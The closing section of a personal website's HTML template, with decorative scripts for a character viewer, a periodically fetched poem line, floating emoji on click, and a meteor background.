        <!-- è®¾ç½®éšæœºæ¨¡æ¿ -->
        
        <script>
            var v = new Viewer({
                basePath: "/model",
                role: "zhala_2",
                mobile: true,
            });
        </script>
        
        <!-- è¯—å¥ -->
        
        <script>
            // // æ¯éš”10åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡getsentenceè¿™ä¸ªå‡½æ•°
            window.setInterval(getsentence, 100*60*5);
            function getsentence() {
                // è¿™é‡Œæ²¡æœ‰è€ƒè™‘IEæµè§ˆå™¨ï¼Œå¦‚æœéœ€è¦æ‹©ifåˆ¤æ–­åŠ 
                var xhr = new XMLHttpRequest();  
                xhr.open('GET', "https://zj.v.api.aa1.cn/api/wenan-shici/?type=json",true);
                xhr.send(JSON.stringify(null));
                xhr.onreadystatechange = function () {
                    if (xhr.status === 200 && xhr.readyState === 4) {
                        //jså¤„ç†æ•°æ®
                        // xhr.responseText.match(/content":(".+?")/g)
                        getdata = JSON.parse(xhr.responseText).msg;
                    }else{
                        getdata = "é•¿é£ç ´æµªä¼šæœ‰æ—¶ï¼Œç›´æŒ‚äº‘å¸†æµæ²§æµ·ã€‚â€”â€”æç™½ã€Šè¡Œè·¯éš¾ã€‹";
                    }
                    document.getElementById("sentenceid").innerHTML = getdata;
                }
            }
            window.onload = getsentence;
        </script>
        
        <!-- ç‚¹å‡» -->
        <script>
            let body = document.getElementsByTagName('body')[0];
            body.addEventListener('click', (e) => {
                let contentArr = ['âœŠ','ğŸ˜˜','ğŸ˜','ğŸ˜Š','ğŸ˜­','ğŸ˜¡','ğŸ˜‹','ğŸ‘','ğŸ·','ğŸ˜±','ğŸ’·','ğŸ’µ','Ã—','ğŸ†—','â„–','â­','ğŸŒ™','â™¥','ğŸ’´','â˜€','ğŸ','ğŸ‚','ğŸ','âˆš'];
                let randomNum = function (n) {
                    return Math.floor(Math.random() * n)
                }
                let span = document.createElement('span');
                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
                span.style.position = 'absolute';
                span.style.top = `${e.pageY}px`;
                span.style.left = `${e.pageX}px`;
                span.style.transition = 'all 1s ease';
                span.style.zIndex = 20000;
                body.appendChild(span)
                setTimeout(()=>{
                    span.style.top = span.offsetTop - 100 + 'px';
                    span.style.opacity = 0;
                    setTimeout(()=>{span.remove()},700)
                },0)
            })
        </script>
        <!-- æµæ˜ŸèƒŒæ™¯ç‰¹æ•ˆ -->
        
        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
        <script src="/js/meteorbackground.js"></script>
        
        <script src="/js/main.js"></script>
    </body>
</html>
